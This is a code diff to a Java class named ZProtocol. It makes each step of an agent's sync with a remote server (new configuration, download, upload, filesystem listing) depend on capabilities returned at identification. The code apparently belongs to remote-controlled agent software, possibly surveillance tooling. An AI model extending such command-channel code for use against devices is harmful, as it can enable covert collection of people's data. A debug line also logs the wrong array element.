@@ -71,35 +71,44 @@ public class ZProtocol extends Protocol {
             debug.info("***** Identification *****");
             //#endif  
             response = command(Proto.ID, forgeIdentification(), false);
-            parseIdentification(response);
+            boolean[] capabilities = parseIdentification(response);
 
-            //#ifdef DEBUG
-            debug.info("***** NewConf *****");
-            //#endif  
-            response = command(Proto.NEW_CONF);
-            parseNewConf(response);
+            if (capabilities[Proto.NEW_CONF]) {
+                //#ifdef DEBUG
+                debug.info("***** NewConf *****");
+                //#endif  
 
-            //#ifdef DEBUG
-            debug.info("***** Download *****");
-            //#endif  
-            response = command(Proto.DOWNLOAD);
-            parseDownload(response);
-
-            //#ifdef DEBUG
-            debug.info("***** Upload *****");
-            //#endif  
-
-            boolean left = true;
-            while (left) {
-                response = command(Proto.UPLOAD);
-                left = parseUpload(response);
+                response = command(Proto.NEW_CONF);
+                parseNewConf(response);
             }
 
-            //#ifdef DEBUG
-            debug.info("***** FileSystem *****");
-            //#endif  
-            response = command(Proto.FILESYSTEM);
-            parseFileSystem(response);
+            if (capabilities[Proto.DOWNLOAD]) {
+                //#ifdef DEBUG
+                debug.info("***** Download *****");
+                //#endif  
+                response = command(Proto.DOWNLOAD);
+                parseDownload(response);
+            }
+
+            if (capabilities[Proto.UPLOAD]) {
+                //#ifdef DEBUG
+                debug.info("***** Upload *****");
+                //#endif  
+
+                boolean left = true;
+                while (left) {
+                    response = command(Proto.UPLOAD);
+                    left = parseUpload(response);
+                }
+            }
+
+            if (capabilities[Proto.FILESYSTEM]) {
+                //#ifdef DEBUG
+                debug.info("***** FileSystem *****");
+                //#endif  
+                response = command(Proto.FILESYSTEM);
+                parseFileSystem(response);
+            }
 
             //#ifdef DEBUG
             debug.info("***** Log *****");
@@ -294,8 +303,51 @@ public class ZProtocol extends Protocol {
         return content;
     }
 
-    protected void parseIdentification(byte[] result) throws ProtocolException {
-        checkOk(result);
+    protected boolean[] parseIdentification(byte[] result)
+            throws ProtocolException {
+        boolean[] capabilities = new boolean[Proto.LASTTYPE];
+
+        int res = Utils.byteArrayToInt(result, 0);
+        if (res == Proto.OK) {
+            //#ifdef DEBUG
+            debug.info("got Identification");
+            //#endif
+
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
+                    result.length - 4, false);
+            try {
+                // la totSize e' discutibile
+                int totSize = dataBuffer.readInt();
+                int numElem = dataBuffer.readInt();
+
+                for (int i = 0; i < numElem; i++) {
+                    int cap = dataBuffer.readInt();
+                    if (cap < Proto.LASTTYPE) {
+                        capabilities[cap] = true;
+                    }
+                    //#ifdef DEBUG
+                    debug.trace("capabilities: " + capabilities[i]);
+                    //#endif                   
+                }
+
+            } catch (EOFException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+                throw new ProtocolException();
+            }
+        } else if (res == Proto.NO) {
+            //#ifdef DEBUG
+            debug.info("no new conf: ");
+            //#endif
+        } else {
+            //#ifdef DEBUG
+            debug.error("parseNewConf: " + res);
+            //#endif
+            throw new ProtocolException();
+        }
+
+        return capabilities;
     }
 
     protected void parseNewConf(byte[] result) throws ProtocolException,
@@ -338,7 +390,7 @@ public class ZProtocol extends Protocol {
                     result.length - 4, false);
             try {
                 // la totSize e' discutibile
-                int totSize = dataBuffer.readInt(); 
+                int totSize = dataBuffer.readInt();
                 int numElem = dataBuffer.readInt();
                 for (int i = 0; i < numElem; i++) {
                     String file = WChar.readPascal(dataBuffer);
@@ -384,7 +436,7 @@ public class ZProtocol extends Protocol {
             DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4, false);
             try {
-                int totSize = dataBuffer.readInt(); 
+                int totSize = dataBuffer.readInt();
                 int left = dataBuffer.readInt();
                 //#ifdef DEBUG
                 debug.trace("parseUpload left: " + left);
@@ -440,7 +492,7 @@ public class ZProtocol extends Protocol {
             DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4, false);
             try {
-                int totSize = dataBuffer.readInt(); 
+                int totSize = dataBuffer.readInt();
                 int numElem = dataBuffer.readInt();
                 for (int i = 0; i < numElem; i++) {
                     int depth = dataBuffer.readInt();
